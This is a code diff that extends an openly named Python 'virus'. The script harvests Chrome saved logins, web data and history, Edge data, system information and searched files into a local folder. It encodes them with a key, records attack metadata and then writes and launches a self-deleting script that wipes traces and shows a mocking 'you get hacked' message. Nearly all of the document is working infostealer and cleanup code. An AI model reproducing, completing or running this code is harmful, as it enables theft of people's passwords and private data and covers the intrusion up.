@@ -1,4 +1,4 @@
-true_false=['C:\\Users\\Public', True, True, True, True, True, True, True, True, True, 'hello_world', True, [True, True, 'C:\\Users\\DELL\\Desktop\\toolss', True, ['Book1','lol1','os'], False, []]]
+true_false=[]                                   
 working_directory01=true_false[0]
 system_info_collect=true_false[1]
 chrome_data_collect=true_false[2]
@@ -12,6 +12,8 @@ message_show_y_n=true_false[9]
 message=true_false[10]
 type_of_virus_oftf=true_false[11]
 dir_search_ifnfo=true_false[12]
+key=true_false[13]
+name_of_attack=true_false[14]
 import os
 main_path=working_directory01+'\\app_data'
 os.mkdir(main_path) if not os.path.exists(main_path)else None
@@ -53,7 +55,7 @@ import subprocess
 import random
 while True:
     if check_internet_connection():break
-    else:time.sleep(5)
+    else:time.sleep(5);print('waiting for internet')
 try:import pip
 except ImportError:
     try:import ensurepip;ensurepip.bootstrap()
@@ -404,7 +406,7 @@ def dir_search(saving_path: str, specific_path_tf: bool = True, specific_path: s
         return True, found, found1
     except Exception:
         return False
-def encrypt_data(main_path):
+def encrypt_data(main_path,key):
     try:
         def number_coding(string:str, key:str):
             k=key.split('0');k.pop(k.index(''))
@@ -414,7 +416,6 @@ def encrypt_data(main_path):
             encoded_str = ''.join(c[i]+'0' if i in c else i+'0' for i in string)
             str1 = ''.join(random.choice(c2)+'0' if i == '53' else i+'0' for i in encoded_str.split('0'))
             return str1
-        key="540360960520470490460160630790840420290660850180220410150570270370810170760720890280560870880430730670140260970690550250990240830230350210860930950740530780130650910640680320770380940750190120450330310440480820980590920710510580110390620340610"
         file_list=['system_info','chrome_data','chrome_id_pass','chrome_web_data','chr_history_data','system_edge']
         path=main_path+'\\dir_search'
         for i in file_list:
@@ -426,7 +427,7 @@ def encrypt_data(main_path):
                         try:os.remove(main_path+'\\'+i)
                         except Exception:pass
                     writing.write(str(lol))
-            except Exception as e:print(e)
+            except Exception as e:pass
         if os.path.exists(path):
             path_new=main_path+'\\dir_search_new'
             os.mkdir(path_new) if not os.path.exists(path_new) else None
@@ -436,51 +437,234 @@ def encrypt_data(main_path):
                         try:
                             with open(path+'\\'+i,'rb') as reading:
                                 lol=str(number_coding(str(reading.read()),key))
-                                print(lol)
                                 reading.close()
-                        except Exception as e:print(e)
+                        except Exception as e:pass
                         try:os.remove(path+'\\'+i)
-                        except Exception as e:print(e)
+                        except Exception as e:pass
                         writing.write(lol)
-                except Exception as e:print(e)
+                except Exception as e:pass
+                print()
             try:shutil.rmtree(path)
             except Exception:pass
         else:pass
         return True ,path_new
-    except Exception as e :
-        print(e)
-        return False,None
-def file_transefer(type_of_virus:bool):
-    pass    
-def encrypt_the_system(path_to):
-    pass
-def message_and_deletaion(argiment):
-    pass
+    except Exception as e :return False,None
+def file_transefer(type_of_virus:bool,data:list,data_coolect:list,status,path):
+    info={
+        'name_of_attack':data[1],
+        'encryption_key':data[0],
+        'data_able_to_collect':{
+            'system_info':data_coolect[0],
+            'chrome_basic_data':data_coolect[1],
+            'chrome_id-pass':data_coolect[2],
+            'chrome_web_data':data_coolect[3],
+            'chrome_history_data':data_coolect[4],
+            'edge_data':data_coolect[5],
+            'dir_search':data_coolect[6],
+            'encryption_data':data_coolect[7]
+        },
+        'status':status
+    }
+    with open(path+'\\info.json','w+',encoding='Utf-8')as saving:
+        json.dump(info,saving)
+    if type_of_virus:
+        timmer=120
+        while True:
+            print('all fille extracted to and saved to\n',path,'\ncopy the whole foleder( app_data ) in your devies under 2min after that it will delete everything:)','\ntime remain  ',timmer,colored('/!\\ we are sorry there is no online way to send data yet'))
+            time.sleep(1)
+            timmer-=1
+            os.system('cls')
+            if timmer==0:break
+            else:pass
+        pass
+    else:
+        timmer=120
+        while True:
+            print('all fille extracted to and saved to\n',path,'\ncopy the whole foleder( app_data ) in your devies under 2min after that it will delete everything:)','\ntime remain  ',timmer,)
+            time.sleep(1)
+            timmer-=1
+            os.system('cls')
+            if timmer==0:break
+            else:pass
+def encrypt_the_system():
+    print('that is so dangerus prefer not to use so \nstill i am gonna give update later')
+    return True
+def message_and_deletaion(working_directory,bat_fille):
+    string='''
+    list1=[]
+    import os
+    import time
+    time.sleep(3)
+    code_path_killer=list1[0]
+    code_path_bat=list1[1]
+    working_directory=list1[2]
+    message_y_n=list1[3]
+    message=list1[4]
+    if os.path.exists(code_path_killer):
+        os.remove(code_path_killer)
+    else:
+        pass
+    if os.path.exists(code_path_bat):
+        os.remove(code_path_bat)
+    if os.path.exists(working_directory):
+        try:
+            import shutil
+            shutil.rmtree(working_directory)
+        except Exception as e:
+            import os
+            x_fille=working_directory+'\\envirRRcomuni_0X0'
+            E_fille=working_directory+'\\sys_encrypted_001'
+            x_fille_name=os.listdir(x_fille)
+            for i in x_fille_name:
+                delet_path=x_fille+'\\'+i
+                os.remove(delet_path)
+            try:
+                os.rmdir(x_fille)
+            except Exception as e:
+                pass
+            E_fille_name=os.listdir(E_fille)
+            for i in E_fille_name:
+                delete_path=E_fille+'\\'+i
+                os.remove(delete_path)
+            try:
+                os.rmdir(E_fille)
+            except Exception as e:
+                pass
+            try:
+                os.rmdir(working_directory)
+            except Exception as e:
+                pass
+    else:
+        pass
+    if message_y_n:
+        text=message
+        color_avilable=True
+        try:
+            from termcolor import colored
+        except Exception as e:
+            color_avilable=False
+            pass
+        import time
+        import os
+        if color_avilable:
+            def style(text1,text2,text3,c1,c2):
+                print(colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1))
+                print(colored('==|',color=c2)+'      '+colored('+',color=c2,attrs=['bold'])+'                  '+colored('*',color=c2,attrs=['bold'])+'                                          '+colored('|==',color=c2))
+                print(colored('==|',color=c1)+'                    '+colored('*',color=c1,attrs=['bold'])+'                         '+colored('*',color=c1,attrs=['bold'])+'                     '+colored('|==',color=c1))
+                print(colored('==|',color=c2)+'                                    '+colored('+',color=c1,attrs=['bold'])+'                          '+colored('*',color=c2,attrs=['bold'])+'    '+colored('|==',color=c2))
+                print(colored('==|',color=c1)+''+'{:^{}}'.format(colored(text1,color=c1,attrs=['bold']),81)+colored('|==',color=c1))
+                print(colored('==|',color=c2)+''+'{:^{}}'.format(colored(text2,color=c2,attrs=['bold']),81)+colored('|==',color=c2))
+                print(colored('==|',color=c1)+''+'{:^{}}'.format(colored(text3,color=c1,attrs=['bold']),81)+colored('|==',color=c1))
+                print(colored('==|',color=c2)+'                                               '+colored('+',color=c1,attrs=['bold'])+'                    '+colored('|==',color=c2))
+                print(colored('==|',color=c1)+'                      '+colored('+',color=c1,attrs=['bold'])+'                                        '+colored('*',color=c1,attrs=['bold'])+'    '+colored('|==',color=c1))
+                print(colored('==|',color=c2)+'       '+colored('*',color=c2,attrs=['bold'])+'                      '+colored('*',color=c1,attrs=['bold'])+'                          '+colored('*',color=c2,attrs=['bold'])+'          '+colored('|==',color=c2))
+                print(colored('==|',color=c1)+'       '+colored('+',color=c1,attrs=['bold'])+'                      '+colored('*',color=c2,attrs=['bold'])+'                          '+colored('+',color=c1,attrs=['bold'])+'          '+colored('|==',color=c1))
+                print(colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2)+colored('==',color=c1)+colored('==',color=c2))
+            if len(text)<=68:
+                text_list=text[0:]
+                text_list0=''
+                text_list1=''
+            elif len(text)<=136:
+                text_list=text[0:68]
+                text_list0=text[68:0]
+                text_list1=''
+            elif len(text)<=204:
+                text_list=text[0:68]
+                text_list0=text[68:136]
+                text_list1=text[136:]
+            else:
+                text_list='you are stupid :>'
+                text_list0='and cute <3'
+                text_list1="that's why you get hacked:0"
+            switch=True
+            while True:
+                if switch:
+                    c1='yellow'
+                    c2='blue'
+                    switch=False
+                else:
+                    c1='blue'
+                    c2='yellow'
+                    switch=True
+                style(text_list,text_list0,text_list1,c1,c2)
+                time.sleep(0.20)
+                os.system('cls')
+        else:
+            def style(text1,text2,text3):
+                print('==========================================================================')
+                print('==|      +                  *                                          |==')
+                print('==|                    *                         *                     |==')
+                print('==|                                    +                          *    |==')
+                print('==|'+'{:^{}}'.format(text1,68)+'|==')
+                print('==|'+'{:^{}}'.format(text2,68)+'|==')
+                print('==|'+'{:^{}}'.format(text3,68)+'|==')
+                print('==|                                               +                    |==')
+                print('==|                      +                                        *    |==')
+                print('==|       *                      *                          *          |==')
+                print('==========================================================================')
+            if len(text)<=68:
+                text_list=text[0:]
+                text_list0=''
+                text_list1=''
+            elif len(text)<=136:
+                text_list=text[0:68]
+                text_list0=text[68:0]
+                text_list1=''
+            elif len(text)<=204:
+                text_list=text[0:68]
+                text_list0=text[68:136]
+                text_list1=text[136:]
+            else:
+                text_list='you are stupid :>'
+                text_list0='and cute <3'
+                text_list1="that's why you get hacked:0"
+            style(text_list,text_list0,text_list1)
+    else:
+        pass'''
+    # !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+    nothing=input('enter anything to start deletaion prossess')
+    # !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+    list1=[__file__,bat_fille,working_directory,message_show_y_n,message]
+    ind=string.index('list1')
+    write12=string[0:ind+6]+str(list1)+string[ind+8:]
+    path_desktop=os.environ["USERPROFILE"]+'\\Desktop\\dont_open.py'
+    with open(path_desktop,'w')as pywrite:
+        pywrite.write(write12)
+        pywrite.close()
+    time.sleep(3)
+    command = f'pythonw "{path_desktop}"'
+    subprocess.Popen(command, shell=True)
+    quit()
 # path lists---------------------------------------------------------------------
 main_path=working_directory01+'\\app_data'
 # main_code-------------------------------------------------------------------------
+
 encoding_types = ["UTF-8","UTF-16","UTF-32","ASCII","ANSI","ISO-8859-1","Windows-1252","Unicode"]
-print('i am executed 1')
 if system_info_collect:
         system_info_response=system_info(main_path+'\\system_info',encoding_types)
+else:system_info_response=False
 if chrome_data_collect:
-    if chrome_data:
-        chrome_data_basic_response=chrome_data_basic(main_path+'\\chrome_data')
-    if chrome_id_passsword:
-        chrome_id_password_c_response=chrome_id_password_c(main_path+'\\chrome_id_pass')
-    if web_data:
-        chrome_web_data_response=chrome_web_data(main_path+'\\chrome_web_data')
-    if history_data_tf:
-        history_data_response=history_data(main_path+'\\chr_history_data')
-if edge_data_tf:
-    edge_data_response=edge_data(main_path+'\\system_edge')
+    if chrome_data:chrome_data_basic_response=chrome_data_basic(main_path+'\\chrome_data')
+    else:chrome_data_basic_response=False
+    if chrome_id_passsword:chrome_id_password_c_response=chrome_id_password_c(main_path+'\\chrome_id_pass')
+    else:chrome_id_passsword=False
+    if web_data:chrome_web_data_response=chrome_web_data(main_path+'\\chrome_web_data')
+    else:chrome_web_data_response=False
+    if history_data_tf:history_data_response=history_data(main_path+'\\chr_history_data')
+    else:history_data_response=False
+else:chrome_data_basic_response=False;chrome_id_password_c_response=False;chrome_web_data_response=False;history_data_response=False
+if edge_data_tf:edge_data_response=edge_data(main_path+'\\system_edge')
+else:edge_data_response=False
 if dir_search_ifnfo[0]:
     main_dir=main_path+'\\dir_search'
     os.mkdir(main_dir)if not os.path.exists(main_path+'\\dir_search') else None
-    dir_search(saving_path=main_dir,specific_path_tf=dir_search_ifnfo[1],specific_path=dir_search_ifnfo[2],search_name=dir_search_ifnfo[3],search_extension=dir_search_ifnfo[5],list_of_search=dir_search_ifnfo[4],list_of_extension_search=dir_search_ifnfo[6])
-if encrypt_data_tf:
-    encrypt_data_response=encrypt_data(main_path)
-if type_of_virus_oftf:
-    pass
-if message_show_y_n:
-    pass
+    dir_search_ifnfo_response=dir_search(saving_path=main_dir,specific_path_tf=dir_search_ifnfo[1],specific_path=dir_search_ifnfo[2],search_name=dir_search_ifnfo[3],search_extension=dir_search_ifnfo[5],list_of_search=dir_search_ifnfo[4],list_of_extension_search=dir_search_ifnfo[6])
+else:dir_search_ifnfo_response=False
+if encrypt_data_tf:encrypt_data_response=encrypt_data(main_path,true_false[13])
+else:encrypt_data_response=False
+info=[system_info_response if system_info_collect else None,chrome_data_basic_response if chrome_data else None,chrome_id_password_c_response if chrome_id_passsword else None,chrome_web_data_response if web_data else None,history_data_response if history_data_tf else None,edge_data_response if edge_data_tf else None,dir_search_ifnfo_response if dir_search_ifnfo else None,encrypt_data_response if encrypt_data_tf else None]
+file_transefer(type_of_virus=type_of_virus_oftf,data=[key,name_of_attack],data_coolect=info,status=str(datetime.now()),path=main_path)
+# message_and_deletaion()
+# message_and_deletaion()
+quit()
